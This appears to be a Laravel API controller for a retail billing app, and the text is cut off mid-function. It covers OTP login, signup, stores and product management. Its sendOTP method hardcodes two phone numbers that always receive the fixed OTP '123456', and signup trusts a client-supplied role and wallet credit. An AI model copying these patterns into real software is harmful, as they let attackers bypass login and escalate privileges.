<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Otp;
use App\Models\Store;
use App\Models\Module;
use App\Models\StoreType;
use App\Models\Product;
use App\Models\Unit;
use App\Models\Category;
use App\Models\BillDetail;
use App\Models\Testing;
use App\Models\Attribute;
use App\Models\AppVersion;
use App\Models\TemplateCategory;
use App\Models\TemplateMarket;
use App\Models\TemplateOffer;
use App\Models\VendorStockPurchase;
use App\Models\Coupan;
use App\Models\ExpenseCategory;
use App\Models\Expense;
use App\Models\Verifications;
use App\Models\Kot;
use App\Models\BillToken;
use App\Models\PromotionalBanner;
use App\Models\HomepageVideo;
use App\Models\Tutorial;
use App\Models\StockTransfer;
use App\Models\AppActivity;
use App\Models\SocialMedia;
use App\Models\HomeDeliveryDetail;
use App\Models\Wallet;
use App\Models\CustomerOrder;
use App\Models\CustomerBanner;
use App\Models\SubscriptionPackage;
use App\Models\WholesellerBillcreate;
use App\Models\ShiftTimings;
use App\Models\DeliveryPartners;
use App\Models\DeliveryPartnerEarnings;
use App\Models\DPOrderStatus;
use App\Models\MerchantOrderStatus;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use Response;
use Spatie\Permission\Models\Role;
use Illuminate\Support\Facades\Log;
use Spatie\Permission\Models\Permission;
use App\Models\CentralLibrary;
use Illuminate\Support\Facades\Auth;

use App\Models\SubCategory;
use App\Models\PackageOrder;
use App\Models\PackageTransection;
use App\Models\TemplateType;
use App\Models\NotificationHistory;
use App\Models\OrderStatus;

use Illuminate\Support\Str;
use App;
use Session;
use Stichoza\GoogleTranslate\GoogleTranslate;

use App\Events\OrderStatusUpdated;

use PDF;
use Carbon\Carbon;

use App\Exports\BillExport;
use Excel;

// JOBS
use App\Jobs\UpdateOrderStatus;

class ApiController extends Controller
{
    public function getRoles()
    {
        try {
            $roles = Role::all();
            $response = ['success' => true, 'message' => 'Roles detail', 'Roles' => $roles];

            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function sendOTP(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'phone' => 'required|numeric|digits:10',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                if($request->phone == '9634188285' || $request->phone == '9670006261'){
                    $randNo = '123456';
                }else{
                    $randNo = rand(100000, 999999);
                    $phone = $request->phone;

                    // print_r($postdata); die;

                    $sendOtpResponse = CommonController::sendMsg91WhatsappOtp($phone, $randNo);
                }

                $checkPhone = Otp::where('phone_number',$request->phone)->first();
                if($checkPhone){
                    $otp = Otp::where('phone_number',$request->phone)->update(['otp' => $randNo]);
                }else{
                    $otp = Otp::create([
                        'phone_number'     => $request->phone,
                        'otp'              => $randNo,
                    ]);
                }
                DB::commit();

                $response = ['success' => true, 'message' => 'Otp send successfully'];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function verifyOTP(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'phone' => 'required|numeric|digits:10',
                'otp'   => 'required|numeric',
                'device_token' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);
            $store = $token =  null;

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $checkOtp = Otp::where("phone_number",$request->phone)->where('otp',$request->otp)->first();
                if(!empty($checkOtp)){
                    $user = User::where('whatsapp_no',$request->phone)->first();
                    if(!empty($user)){
                        $store = Store::where('user_id', $user->id)->first();
                        User::where('whatsapp_no',$request->phone)->update(['device_token' => $request->device_token]);
                        $user = User::where('whatsapp_no',$request->phone)->first();

                        Auth::login($user);
                        $token = $user->createToken('billpe.cloud')->accessToken;

                        $activity = AppActivity::create([
                            'action'  => 'Login',
                            'message' => $user->name.' logged in',
                        ]);
                        $activity->save();

                        DB::commit();
                        $response = ['success' => true, 'is_complete' => true, 'message' => 'User Login successfully.', 'token' => $token, 'data' => $user, 'store' => $store];
                    }else{
                        $data = [
                            'whatsappNo' => $request->phone,
                            'roleType' => 4
                        ];
                        $response = ['success' => true, 'is_complete' => false, 'message' => 'Complete your profile.', 'token' => $token, 'data'=> $data , 'store' => $store];
                    }
                }else{
                    return Response::json(['success' => false, 'message' => "Phone or otp is not valid. Enter valid detail."], 404);
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function verifyToken(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'otpless_token' => 'required',
                'device_token' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                return Response::json(['status' => false, 'message' => $validator->errors()->all()], 404);
            } else {

                $verifyOtpLess = CommonController::verifyOTPLess($request->otpless_token);
                if(array_key_exists('message',$verifyOtpLess))
                {
                    return Response::json(['status' => false, 'message' => 'Unable to login. kindly login first.'], 200);
                }

                if($verifyOtpLess['authentication_details']['phone'])
                {
                    $phoneNumber = $verifyOtpLess['authentication_details']['phone']['phone_number'];
                    $user = User::where('whatsapp_no',$phoneNumber)->where('role_type',2)->first();
                    if(!$user){
                        $user = User::where('whatsapp_no',$phoneNumber)->where('role_type',6)->first();
                    }
                    if($user){
                        $store = null;
                        if($user->role_type == 2){
                            $store = Store::where('user_id', $user->id)->first();
                        }
                        User::where('whatsapp_no',$phoneNumber)->update(['device_token' => $request->device_token]);

                        Auth::login($user);
                        $token = $user->createToken('billpe.cloud')->accessToken;

                        $activity = AppActivity::create([
                            'action'  => 'Login',
                            'message' => $user->name.' logged in',
                        ]);
                        $activity->save();

                        DB::commit();

                        return response()->json(['success' => true, 'is_complete' => true, 'message' => 'User Login successfully.', 'token' => $token, 'data' => $user, 'store' => $store], 200);
                    }else{
                        return Response::json(['status' => true, 'is_complete' => false, 'message' => 'Complete your profile.', 'data' => $verifyOtpLess], 200);
                    }
                }
            }
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }


    public function logout()
    {
        $tokenCurrent = Auth::user()->token();
        DB::table('oauth_access_tokens')
                ->where('id',$tokenCurrent->id)
                ->update([ 'revoked' =>true]);

        $tokenCurrent->revoke();
        return Response::json(['success' => true, 'message' => 'logout'], 200);
    }

    public function addUser(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'whatsapp_no' => 'required|numeric|digits:10',
                'role_type' => 'required|numeric',
            ];
                if($request->role_type == '2'){
                    $rules['store_type'] = 'required';
                    $rules['store_category'] = 'required';
                    $rules['shop_name'] = 'required';
                    $rules['owner_name'] = 'required';
                }else if($request->role_type == '3' || $request->role_type == '4'){
                    $rules['merchant_id'] = 'required';
                    $rules['store_id'] = 'required';
                }else if($request->role_type == '5'){
                    // $rules['aadhar_number'] = 'required';
                    // $rules['driving_licence'] = 'required';
                    $rules['store_id'] = 'required';
                }else if($request->role_type == '6'){
                    $rules['store_id'] = 'required';
                    $rules['merchant_id'] = 'required';
                }
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $checkUserformultiple = User::where('whatsapp_no',$request->whatsapp_no)->where('role_type',$request->role_type)->first();
                if($checkUserformultiple){

                    // IF User exist but store note exist.
                        if($request->role_type == 2)
                        {
                            #save image
                            $store_image = $request->store_image;
                            if ($store_image) {
                                $path  = config('image.profile_image_path_view');
                                $store_image = CommonController::saveImage($store_image, $path , 'store');
                            }else{
                                $store_image = null;
                            }

                            //get package
                            $package = SubscriptionPackage::where('id',1)->first();
                            $validdate = date('Y-m-d',strtotime(''.$package->validity_days.' days'));

                            $storeAdd = Store::where('user_id', $checkUserformultiple->id)->first();
                            if(empty($storeAdd)){
                                $storeAdd = Store::create([
                                    'user_id'               => $checkUserformultiple->id,
                                    'store_type'            => $request->store_type,
                                    'module_id'             => $request->store_category,
                                    'store_image'           => $store_image,
                                    'shop_name'             => $request->shop_name,
                                    'latitude'              => $request->latitude,
                                    'longitude'             => $request->longitude,
                                    'address'               => $request->address,
                                    'pincode'               => $request->pincode,
                                    'city'                  => $request->city,
                                    'gst'                   => $request->gst,
                                    'owner_name'            => $request->owner_name,
                                    'package_id'            => $package->id,
                                    'package_active_date'   => date('Y-m-d'),
                                    'package_valid_date'    => $validdate,
                                    'package_amount'        => $package->subscription_price,
                                    'package_status'        => $package->status,
                                    'store_open_time'       => $request->store_open_time,
                                    'store_close_time'      => $request->store_close_time,
                                    'store_days'            => $request->store_days,
                                ]);

                                $storeAdd->save();
                            }


                            $token = $checkUserformultiple->createToken('billpe.cloud')->accessToken;
                            DB::commit();
                            return Response::json(['success' => true, 'message' => 'User added successfully', 'token'=>$token, 'data' => $checkUserformultiple, 'store' => $storeAdd], 200);
                        }
                    //
                    return Response::json(['success' => false, 'message' => "The user of this role already exists."], 200);
                }

                #save image
                $image = $request->image;
                if ($image) {
                    $path  = config('image.profile_image_path_view');
                    $image = CommonController::saveImage($image, $path, 'user');
                }else{
                    $image = null;
                }

                $roleID = Role::where('id',$request->role_type)->first();

                $password = $request->password;
                if($request->password){
                  $password = bcrypt($request->password);
                }

                if($request->role_type == '6'){
                    $checkstaffforstore = User::where('store_id',$request->store_id)->count();
                    if($checkstaffforstore == 5){
                        return Response::json(['success' => false, 'message' => "A store can add just 5 staff. Your 5 staff are complete."], 200);
                    }
                }

                #add user
                $userAdd = User::create([
                    'user_id'           => $request->merchant_id,
                    'store_id'          => $request->store_id,
                    'name'              => $request->name,
                    'vender_for'        => $request->vender_for,
                    'address'           => $request->user_address,
                    'email'             => $request->email,
                    'password'          => $password,
                    'role_type'         => $roleID->id,
                    'whatsapp_no'       => $request->whatsapp_no,
                    'image'             => $image,
                    'notes'             => $request->notes,
                    'unique_id'         => CommonController::generate_uuid('users'),
                    'aadhar_number'     => $request->aadhar_number,
                    'driving_licence'   => $request->driving_licence,
                    'device_token'      => $request->device_token,
                ]);
                #assign role to user
                $userAdd->syncRoles($roleID->id);
                $userAdd->save();

                $token = $userAdd->createToken('billpe.cloud')->accessToken;
                if($request->role_type == '2'){

                    #save image
                    $store_image = $request->addStore;
                    if ($store_image) {
                        $path  = config('image.profile_image_path_view');
                        $store_image = CommonController::saveImage($store_image, $path , 'store');
                    }else{
                        $store_image = null;
                    }

                    //get package
                    $package = SubscriptionPackage::where('id',1)->first();
                    $validdate = date('Y-m-d',strtotime(''.$package->validity_days.' days'));

                    if(@$checkUserformultiple->id) {
                        $storeAdd = Store::where('user_id', $checkUserformultiple->id)->first();
                    } else {
                        $storeAdd = null;
                    }
                    if(empty($storeAdd)){
                        $storeAdd = Store::create([
                            'user_id'               => $userAdd->id,
                            'store_type'            => $request->store_type,
                            'module_id'             => $request->store_category,
                            'store_image'           => $store_image,
                            'shop_name'             => $request->shop_name,
                            'latitude'              => $request->latitude,
                            'longitude'             => $request->longitude,
                            'address'               => $request->address,
                            'pincode'               => $request->pincode,
                            'city'                  => $request->city,
                            'gst'                   => $request->gst,
                            'owner_name'            => $request->owner_name,
                            'package_id'            => $package->id,
                            'package_active_date'   => date('Y-m-d'),
                            'package_valid_date'    => $validdate,
                            'package_amount'        => $package->subscription_price,
                            'package_status'        => $package->status,
                            'store_open_time'       => $request->store_open_time,
                            'store_close_time'      => $request->store_close_time,
                            'store_days'            => $request->store_days,
                        ]);

                        $storeAdd->save();
                    }

                    if($request->device_token){
                        $postdata = '{
                            "to" : "'.$request->device_token.'",
                            "notification" : {
                                "body" : "BillPe pa apka Swagat hai!",
                                "title": "New Store"
                            },
                            "data" : {
                                "type": "Dashboard"
                            },
                            }';
                        $sendNotification = \App\Helpers\Notification::send($postdata);
                    }

                    $phoneWhatsapp = '91'.$request->whatsapp_no;
                    $postdata = '{
                        "messaging_product": "whatsapp",
                        "to": "'.$phoneWhatsapp.'",
                        "type": "template",
                        "template": {
                            "name": "new_store",
                            "language": {"code": "hi"},
                            "components": [
                                {
                                    "type": "body",
                                    "parameters": [
                                        {
                                            "type": "text",
                                            "text": "'.$userAdd->name.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$storeAdd->shop_name.'"
                                        }
                                    ]
                                }
                            ]
                        }
                    }';

                    $sendWhatsappResponse = CommonController::sendWhatsappOtp($postdata);

                }else{
                    $storeAdd = null;
                }

                if($request->role_type == '4'){
                    $billCount = 1;
                    $bill = BillDetail::where('store_id', $request->store_id)->orderBy('created_at','DESC')->first();
                    if($bill){
                        $billCount = $bill->bill_number + 1;
                    }
                    $uniqueId = Str::random(8) . time();
                    if($request->total_past_due_amount && $request->due_date){
                        $customerpastduebill = BillDetail::create([
                            'store_id'          => $request->store_id,
                            'customer_name'     => $request->name,
                            'customer_number'   => $request->whatsapp_no,
                            'amount'            => $request->total_past_due_amount,
                            'total_amount'      => $request->total_past_due_amount,
                            'due_amount'        => $request->total_past_due_amount,
                            'due_date'          => $request->due_date,
                            'unique_id'         => $uniqueId,
                            'combined_id'       => $billCount . $uniqueId,
                            'bill_number'       => $billCount,
                        ]);
                        $customerpastduebill->save();
                    }
                }

                if($request->role_type == '6'){
                    $merchant = User::where('id',$request->merchant_id)->first();
                    // print_r($merchant->name); die;
                    $activityStaff = AppActivity::create([
                        'action'  => 'Staff Added',
                        'message' =>  $merchant->name .' added New Staff '.$userAdd->name,
                    ]);
                    $activityStaff->save();
                }


                if($request->referral_code && $request->referral_amount)
                {
                    $referUser = User::where('referral_code',$request->referral_code)->first();
                    $walletHistory = Wallet::create([
                        'user_id'           => $userAdd->id,
                        'refer_id'          => $referUser->id,
                        'payment_type'      => 'refer',
                        'amount'            => $request->referral_amount,
                        'total_user_amount' => $request->referral_amount,
                    ]);
                    $walletHistory->save();

                    $userAdd = User::where('id',$userAdd->id)->first();
                    $userAdd->total_wallet_amount = $userAdd->total_wallet_amount+$request->referral_amount;
                    $userAdd->save();
                }

                $activity = AppActivity::create([
                    'action'  => 'Signup',
                    'message' => $userAdd->name.' signup in',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'User added successfully', 'token'=>$token, 'data' => $userAdd, 'store' => $storeAdd];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getPackage()
    {
        try {
            $package = SubscriptionPackage::where('name' , '!=', 'Trial')->where('status',1)->get();
            $response = ['success' => true, 'message' => 'Package detail', 'Package' => $package];

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getModule()
    {
        try {
            $module = Module::all();
            $response = ['success' => true, 'message' => 'Module detail', 'Module' => $module];

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getStoreType()
    {
        try {
            $storeType = StoreType::all();
            $response = ['success' => true, 'message' => 'Module detail', 'Store_type' => $storeType];

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getAttribute()
    {
        try {
            $attribute = Attribute::all();
            $response = ['success' => true, 'message' => 'Attribute detail', 'Attribute' => $attribute];

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function searchByAttributeName(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'attribute_name' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $attributes = Attribute::where('name', $request->attribute_name)->first();
                if ($attributes) {
                    $response = ['success' => true, 'message' => 'Attribute List', 'Attribute' => $attributes];
                } else {
                    $response = ['success' => false, 'message' => 'Attribute not found, Considered from adding.'];
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addAttribute(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'attribute_name' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $attributes = Attribute::where('name', $request->attribute_name)->first();

                if($attributes)
                {
                    return Response::json(['success' => false, 'message' => 'Attribute already exist.']);
                }
                $atribute = Attribute::create([
                    'name'         => $request->attribute_name,
                ]);

                DB::commit();

                $response = ['success' => true, 'message' => 'Attribubte added successfully' , 'Attribute' => $atribute];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getUnit()
    {
        try {
            $unit = Unit::all();
            $response = ['success' => true, 'message' => 'Unit detail', 'Unit' => $unit];

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addUnit(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'module_id' => 'required|exists:modules,id|numeric',
                'name' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $unit = Unit::create([
                    'module_id'       => $request->module_id,
                    'name'            => $request->name,
                ]);
                DB::commit();
                $response = ['success' => true, 'message' => 'Unit added successfully' , 'data' => $unit];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function updateStoreImage(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
                'store_image' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $store = Store::where('id',$request->store_id)->first();
                #save image
                $store_image = $request->store_image;
                if ($store_image) {
                    $find = url('/storage');
                    $pathurl = str_replace($find, "", $store->store_image);

                    if(File::exists('storage'.$pathurl))
                    {
                        File::delete('storage'.$pathurl);
                    }
                    $path  = config('image.profile_image_path_view');
                    $store_image = CommonController::saveImage($request->store_image, $path , 'store');
                }else{
                    $store_image = null;
                }

                $store->store_image   = $store_image;
                $store->save();
                DB::commit();
                $response = ['success' => true, 'message' => 'Store Image updated successfully'];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getCategory(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'module_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $category = Category::where('module_id',$request->module_id)->get();
                $response = ['success' => true, 'message' => 'Category detail', 'Category' => $category];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getSubCategory(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'category_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $subcategory = SubCategory::where('category_id',$request->category_id)->get();
                $response = ['success' => true, 'message' => 'Sub Category detail', 'Sub Category' => $subcategory];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addCategory(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'module_id' => 'required|exists:modules,id|numeric',
                'category_name' => 'required|string',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->first(),'data' => null];
            } else {

                $category = Category::create([
                    'name'               => $request->category_name,
                    'module_id'          => $request->module_id,
                    'status'             => '1',
                ]);
                $category->save();
                DB::commit();
                $response = ['success' => true, 'message' => 'Category added successfully', 'category' => $category];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addSubCategory(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'category_id' => 'required|exists:categories,id|numeric',
                'sub_category_name' => 'required|string',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->first(),'data' => null];
            } else {
                $subcategory = SubCategory::create([
                    'name'               => $request->sub_category_name,
                    'category_id'        => $request->category_id,
                    'status'             => '1',
                ]);
                $subcategory->save();
                DB::commit();
                $response = ['success' => true, 'message' => 'Sub Category added successfully', 'subcategory' => $subcategory];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
                'qtn' => 'required|numeric',
                'unit' => 'required',
                'category_id' => 'nullable|exists:categories,id|numeric',
                'name' => 'required|string',
                'mrp' => 'required',
                'stock' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->first(),'data' => null];
            } else {
                // print_r("yes"); die;
                $store = Store::where('id',$request->store_id)->first();

                $existingProductInDifferentCategory = Product::where('quantity', $request->qtn)
                    ->where('unit', $request->unit)
                    ->where('product_name', $request->name)
                    ->where('store_id', $request->store_id)
                    ->first();

                if ($existingProductInDifferentCategory) {
                    return ["status" => false, 'message' => 'A product with the same qtn and unit exists already.'];
                }

                $existingProductWithSameName = Product::where('product_name', $request->name)
                ->where('store_id', $request->store_id)
                ->first();

                $barcode = $request->barcode;
                $barcode_two = $request->barcode_two;

                if ($existingProductWithSameName != null) {
                    // If a product with the same name and store exists, use its barcode
                    $barcode = $existingProductWithSameName->barcode;
                    $barcode_two = $existingProductWithSameName->barcode_two;
                } elseif ($barcode != null) {

                    // If a barcode is provided, check for its uniqueness
                    $existingProductWithSameBarcode = Product::where('store_id', $request->store_id)
                        ->where('barcode', $barcode)
                        ->first();

                    if ($existingProductWithSameBarcode != null) {
                        // If a product with the same barcode exists, return an error
                        return ["status" => false, 'message' => 'Add a unique barcode.'];
                    }
                }

                $category_id = $request->category_id ?? $this->getUncategorizedCategoryIdForStore($request->store_id);


                if($request->product_image_url)
                {
                    $product_image = $request->product_image_url;
                }else{
                    #save image
                    $product_image = $request->product_image;
                    if ($product_image) {
                        $path  = config('image.profile_image_path_view');
                        $product_image = CommonController::saveImage($product_image, $path , 'product');
                    }else{
                        $product_image = null;
                    }
                }

                $category = Category::where('id',$category_id)->first();

                $product = Product::create([
                    'store_id'           => $request->store_id,
                    'module_id'          => $store->module_id,
                    'category'           => $category_id,
                    'subCategory_id'     => $request->subcategory_id,
                    'barcode'            => $barcode,
                    'barcode_two'        => $barcode_two,
                    'product_image'      => $product_image,
                    'product_name'       => $request->name,
                    'unit'               => $request->unit,
                    'sub_unit'           => $request->sub_unit,
                    'package_weight'     => $request->package_weight,
                    'package_size'       => $request->package_size,
                    'quantity'           => $request->qtn,
                    'sub_quantity'       => $request->sub_quantity,
                    'mrp'                => $request->mrp,
                    'sub_mrp'            => $request->sub_mrp,
                    'retail_price'       => $request->retail_price,
                    'sub_retail_price'   => $request->sub_retail_price,
                    'wholesale_price'    => $request->wholesale_price,
                    'members_price'      => $request->member_price,
                    'purchase_price'     => $request->purchase_price,
                    'sub_purchase_price' => $request->sub_purchase_price,
                    'stock'              => $request->stock,
                    'sub_stock'          => $request->sub_stock,
                    'low_stock'          => $request->low_stock,
                    'gst'                => $request->gst,
                    'hsn'                => $request->hsn,
                    'cess'               => $request->CESS,
                    'expiry'             => $request->expiry_date,
                    'tags'               => $request->tag,
                    'brand'              => $request->brand,
                    'color'              => $request->color,
                    'status'             => '1',
                    'food_type'            => $request->food_type,
                ]);
                $product->save();

                //add central Library
                $existingProduct = CentralLibrary::where('product_name', $product->product_name)->where('quantity', $product->qtn)
                ->where('unit', $product->unit)->first();
                if (!$existingProduct) {

                    $centrallib = new CentralLibrary();
                    $centrallib->product_id = $product->id;
                    $centrallib->module_id = $product->module_id;
                    $centrallib->category = $request->subcategory_id;
                    $centrallib->subCategory_id = $product->module_id;
                    $centrallib->barcode = $product->barcode;
                    $centrallib->barcode_two = $product->barcode_two;
                    $centrallib->unit = $product->unit;
                    $centrallib->quantity = $product->quantity;
                    $centrallib->product_name = $product->product_name;
                    $centrallib->product_image = $product->product_image;
                    $centrallib->package_weight = $product->package_weight;
                    $centrallib->mrp = $product->mrp;
                    $centrallib->retail_price = $product->retail_price;
                    $centrallib->wholesale_price = $product->wholesale_price;
                    $centrallib->members_price = $product->members_price;
                    $centrallib->purchase_price = $product->purchase_price;
                    $centrallib->gst = $product->gst;
                    $centrallib->hsn = $product->hsn;
                    $centrallib->cess = $product->cess;
                    $centrallib->expiry = $product->expiry;
                    $centrallib->tags = $product->tag;
                    $centrallib->brand = $product->brand;
                    $centrallib->color = $product->color;
                    $centrallib->food_type = $product->food_type;
                    $centrallib->save();
                }
                //

                $product->category = $category;

                $activity = AppActivity::create([
                    'action'  => 'Add new Product',
                    'message' => Auth::user()->name.' Added New Product',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Product added successfully', 'data' => $product];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function updateProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'product_id' => 'required|exists:products,id|numeric',
                'qtn' => 'required|numeric',
                'unit' => 'required',
                'category_id' => 'nullable|exists:categories,id|numeric',
                'name' => 'required|string',
                'mrp' => 'required',
                'stock' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $product = Product::with('category')->where('id', $request->product_id)->first();

                if($request->product_image_url)
                {
                    $product_image = $request->product_image_url;
                }else{
                    #save image
                    $product_image = $request->product_image;
                    if ($product_image) {
                        $find = url('/storage');
                        $pathurl = str_replace($find, "", $product->product_image);

                        if(File::exists('storage'.$pathurl))
                        {
                            File::delete('storage'.$pathurl);
                        }

                        $path  = config('image.profile_image_path_view');
                        $product_image = CommonController::saveImage($product_image, $path , 'product');
                    }else{
                        $product_image = $product->product_image;
                    }
                }

                $category_id = $request->category_id ?? $this->getUncategorizedCategoryIdForStore($request->store_id);
                $category = Category::where('id',$category_id)->first();

                $product->category           = $category_id;
                $product->subCategory_id     = $request->subcategory_id;
                $product->product_name       = $request->name;
                $product->barcode            = $request->barcode;
                $product->barcode_two        = $request->barcode_two;
                $product->product_image      = $product_image;
                $product->unit               = $request->unit;
                $product->sub_unit           = $request->sub_unit;
                $product->package_weight     = $request->package_weight;
                $product->package_size       = $request->package_size;
                $product->quantity           = $request->qtn;
                $product->sub_quantity       = $request->sub_quantity;
                $product->mrp                = $request->mrp;
                $product->sub_mrp            = $request->sub_mrp;
                $product->retail_price       = $request->retail_price;
                $product->sub_retail_price   = $request->sub_retail_price;
                $product->wholesale_price    = $request->wholesale_price;
                $product->members_price      = $request->member_price;
                $product->purchase_price     = $request->purchase_price;
                $product->sub_purchase_price = $request->sub_purchase_price;
                $product->stock              = $request->stock;
                $product->sub_stock          = $request->sub_stock;
                $product->low_stock          = $request->low_stock;
                $product->gst                = $request->gst;
                $product->hsn                = $request->hsn;
                $product->cess               = $request->CESS;
                $product->expiry             = $request->expiry_date;
                $product->tags               = $request->tag;
                $product->brand              = $request->brand;
                $product->color              = $request->color;
                $product->food_type         = $request->food_type;
                $product->save();

                $existingProduct = CentralLibrary::where('product_name', $product->product_name)->where('quantity', $product->qtn)
                ->where('unit', $product->unit)->first();
                if (!$existingProduct) {
                    $centrallib = new CentralLibrary();
                    $centrallib->product_id = $product->id;
                    $centrallib->module_id = $product->module_id;
                    $centrallib->category = $product->category_id;
                    $centrallib->barcode = $product->barcode;
                    $centrallib->unit = $product->unit;
                    $centrallib->quantity = $product->qtn;
                    $centrallib->product_name = $product->product_name;
                    $centrallib->product_image = $product->product_image;
                    $centrallib->package_weight = $product->package_weight;
                    $centrallib->package_size    = $product->package_size;
                    $centrallib->mrp = $product->mrp;
                    $centrallib->retail_price = $product->retail_price;
                    $centrallib->wholesale_price = $product->wholesale_price;
                    $centrallib->members_price = $product->members_price;
                    $centrallib->purchase_price = $product->purchase_price;
                    $centrallib->gst = $product->gst;
                    $centrallib->hsn = $product->hsn;
                    $centrallib->cess = $product->cess;
                    $centrallib->expiry = $product->expiry;
                    $centrallib->tags = $product->tag;
                    $centrallib->brand = $product->brand;
                    $centrallib->color = $product->color;
                    $centrallib->food_type = $product->food_type;
                    $centrallib->save();
                }

                $product->category = $category;

                $activity = AppActivity::create([
                    'action'  => 'Edit Product',
